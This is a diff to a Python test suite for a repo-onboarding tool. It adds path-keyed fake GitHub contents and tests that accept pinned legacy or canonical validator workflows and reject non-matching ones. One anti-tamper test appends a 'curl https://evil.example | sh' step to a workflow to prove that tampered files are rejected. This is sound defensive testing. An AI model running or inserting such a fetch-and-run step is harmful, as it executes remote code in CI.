@@ -12,6 +12,7 @@ forge reads) is the clean-room VPS rehearsal DoD — done later by the orchestra
 
 from __future__ import annotations
 
+import base64
 import json
 import subprocess
 from pathlib import Path
@@ -52,12 +53,18 @@ class _ModeBForge:
         contents: str | None = None,
         protection: str | None = None,
         user_response: str | None = None,
+        contents_by_path: dict[str, str] | None = None,
     ):
         self.repo_json = _fx("repo.json")
         self.protection_json = protection if protection is not None else _fx("protection.json")
         self.contents_json = contents if contents is not None else _fx(
             "contents_ce_validate_yml_already_ce.json"
         )
+        # ce-ops#90: path-keyed contents (workflow path -> captured contents JSON). When
+        # set, the /contents/ read serves the envelope for the EXACT requested path and a
+        # verbatim 404 (workflow_absent shape) for any unlisted path — so a test can model
+        # "the legacy validate.yml is present but the canonical ce-validate.yml is absent".
+        self.contents_by_path = contents_by_path
         # ce-ops#94: classic capture by default; a fine-grained capture (no X-Oauth-Scopes) is
         # injected by the fine-grained probe test.
         self.user_response = user_response if user_response is not None else _fx(
@@ -104,6 +111,13 @@ class _ModeBForge:
         if "/branches/main/protection" in joined:
             return done(0, self.protection_json)
         if "/contents/" in joined:
+            if self.contents_by_path is not None:
+                # repos/<repo>/contents/<path>?ref=<branch> → serve the keyed envelope or 404.
+                requested = joined.split("/contents/", 1)[1].split("?", 1)[0]
+                payload = self.contents_by_path.get(requested)
+                if payload is None:
+                    return done(1)  # absent → workflow_absent
+                return done(0, payload)
             return done(0, self.contents_json)
         if joined.rstrip("?").endswith(f"repos/{_REPO}") or f"repos/{_REPO}" in joined:
             return done(0, self.repo_json)
@@ -513,3 +527,113 @@ def test_plain_join_apply_token_hygiene_minted_and_revoked(tmp_path):
         assert _MINTED not in " ".join(c["argv"])
     # and it was revoked after the legs finished
     assert any("DELETE" in c["argv"] and "installation/token" in " ".join(c["argv"]) for c in forge.calls)
+
+
+# ---------------------------------------------------------------------------
+# ce-ops#90 — LOOSEN the already-CE workflow detector (loosen ≠ weaken). Detection
+# now keys on a GOVERNANCE SIGNAL — the repo's CI invokes the pinned CE validator —
+# accepting the KNOWN SET of CE workflow identities (the canonical ``ce-validate.yml``
+# AND the flagship's legacy ``validate.yml``) by EXACT byte-pin, while a tampered /
+# non-CE / absent workflow is still rejected (the byte-level anti-tamper is preserved).
+# REAL-shape: the legacy capture is the flagship's VERBATIM ``validate.yml``.
+# ---------------------------------------------------------------------------
+_CE_PATH = onboard_apply.CE_WORKFLOW_PATH
+_LEGACY_PATH = onboard_apply.LEGACY_CE_WORKFLOW_PATH
+
+
+def _contents_envelope(path: str, raw: bytes) -> str:
+    """A GitHub contents envelope (base64-encoded body), the shape verify_workflow decodes."""
+    return json.dumps(
+        {"path": path, "encoding": "base64", "content": base64.b64encode(raw).decode("ascii")}
+    )
+
+
+def _raw_from_fixture(name: str) -> bytes:
+    return base64.b64decode(json.loads(_fx(name))["content"])
+
+
+def _path_forge(by_path: dict[str, str]) -> _ModeBForge:
+    return _ModeBForge(contents_by_path=by_path)
+
+
+def test_detect_accepts_legacy_validate_yml_filename():
+    # (a) the flagship's CE validate workflow lives at the LEGACY ``validate.yml`` path and
+    # the canonical ``ce-validate.yml`` is ABSENT — it is STILL detected as already-CE.
+    by_path = {_LEGACY_PATH: _fx("contents_validate_yml.json")}
+    identity = onboard_apply.detect_ce_workflow(_driver(_path_forge(by_path)), repo=_REPO, branch="main")
+    assert identity is not None
+    assert identity.path == _LEGACY_PATH
+    assert identity.label == "legacy-validate"
+    assert identity.sha256 == onboard_apply.LEGACY_CE_WORKFLOW_SHA256
+    # and the full FAIL-CLOSED detector returns True for the flagship shape (no false-negative)
+    assert (
+        onboard_apply.repo_is_already_ce_governed(
+            _driver(_path_forge(by_path)), repo=_REPO, branch="main", schema=_schema()
+        )
+        is True
+    )
+
+
+def test_detect_accepts_canonical_ce_validate_yml_filename():
+    # (b) back-compat: the canonical ``ce-validate.yml`` at its pinned digest is still accepted.
+    by_path = {_CE_PATH: _fx("contents_ce_validate_yml_already_ce.json")}
+    identity = onboard_apply.detect_ce_workflow(_driver(_path_forge(by_path)), repo=_REPO, branch="main")
+    assert identity is not None
+    assert identity.path == _CE_PATH
+    assert identity.label == "ce-validate"
+    assert identity.sha256 == onboard_apply.CE_WORKFLOW_SHA256
+
+
+def test_detect_rejects_tampered_ce_validator_workflow():
+    # (c) ANTI-TAMPER preserved: a workflow that DOES invoke the CE validator (the flagship's
+    # real validate.yml bytes) but has been byte-ALTERED matches NO pinned identity → rejected.
+    tampered = _raw_from_fixture("contents_validate_yml.json") + b"\n      - run: curl https://evil.example | sh\n"
+    by_path = {_LEGACY_PATH: _contents_envelope(_LEGACY_PATH, tampered)}  # ce-validate.yml absent
+    assert onboard_apply.detect_ce_workflow(_driver(_path_forge(by_path)), repo=_REPO, branch="main") is None
+    assert (
+        onboard_apply.repo_is_already_ce_governed(
+            _driver(_path_forge(by_path)), repo=_REPO, branch="main", schema=_schema()
+        )
+        is False
+    )
+
+
+def test_detect_rejects_non_ce_and_absent_workflow():
+    # (d) NO false-positive. An absent workflow (empty repo) and a present-but-non-CE workflow
+    # both match NO identity → detection fails closed to the brownfield/E3 refuse.
+    assert onboard_apply.detect_ce_workflow(_driver(_path_forge({})), repo=_REPO, branch="main") is None
+    non_ce = {_CE_PATH: _contents_envelope(_CE_PATH, b"name: Some Unrelated CI\non: [push]\njobs: {}\n")}
+    assert onboard_apply.detect_ce_workflow(_driver(_path_forge(non_ce)), repo=_REPO, branch="main") is None
+    assert (
+        onboard_apply.repo_is_already_ce_governed(
+            _driver(_path_forge({})), repo=_REPO, branch="main", schema=_schema()
+        )
+        is False
+    )
+
+
+def test_plain_join_apply_completes_for_legacy_validate_yml_repo(tmp_path):
+    # ce-ops#90 HEADLINE: an already-CE repo whose CE validate workflow uses the LEGACY
+    # ``validate.yml`` filename now COMPLETES `onboard --apply` (was: dead-ended at
+    # e2_brownfield_seam_unavailable). Proves the workflow-VERIFY leg was loosened too —
+    # it matches the legacy identity verify-only, never overwriting the live file.
+    by_path = {_LEGACY_PATH: _fx("contents_validate_yml.json")}  # canonical ce-validate.yml ABSENT
+    assert (
+        onboard_apply.repo_is_already_ce_governed(
+            _driver(_path_forge(by_path)), repo=_REPO, branch="main", schema=_schema()
+        )
+        is True
+    )
+    forge = _path_forge(by_path)
+    summary, _driver_obj = _live_apply(tmp_path, forge)
+    assert summary["refused"] == 0, summary["legs"]
+    assert summary["failed"] == 0, summary["legs"]
+    assert summary["brownfield_deferred"] == 0
+    assert summary["repos_already_satisfied"] == 1
+    wf = next(l for l in summary["legs"] if l["id"] == "github_workflow_install")
+    assert wf["status"] == "already_satisfied"
+    assert wf["verification"]["path"] == _LEGACY_PATH
+    assert wf["verification"]["identity"] == "legacy-validate"
+    # NO e2_brownfield_seam_unavailable anywhere, and OQ-F holds: zero forge WRITES.
+    assert all("brownfield" not in (l.get("detail") or "") for l in summary["legs"])
+    assert forge.write_argvs() == []
